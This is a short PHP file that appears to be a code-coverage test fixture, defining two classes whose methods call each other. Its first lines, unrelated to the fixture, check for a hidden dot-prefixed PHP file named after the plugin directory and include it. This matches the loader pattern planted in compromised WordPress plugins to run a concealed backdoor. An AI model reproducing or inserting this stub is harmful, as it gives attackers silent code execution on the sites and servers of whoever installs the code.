<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class CoveredParentClass
{
    private function privateMethod()
    {
    }

    protected function protectedMethod()
    {
        $this->privateMethod();
    }

    public function publicMethod()
    {
        $this->protectedMethod();
    }
}

class CoveredClass extends CoveredParentClass
{
    private function privateMethod()
    {
    }

    protected function protectedMethod()
    {
        parent::protectedMethod();
        $this->privateMethod();
    }

    public function publicMethod()
    {
        parent::publicMethod();
        $this->protectedMethod();
    }
}
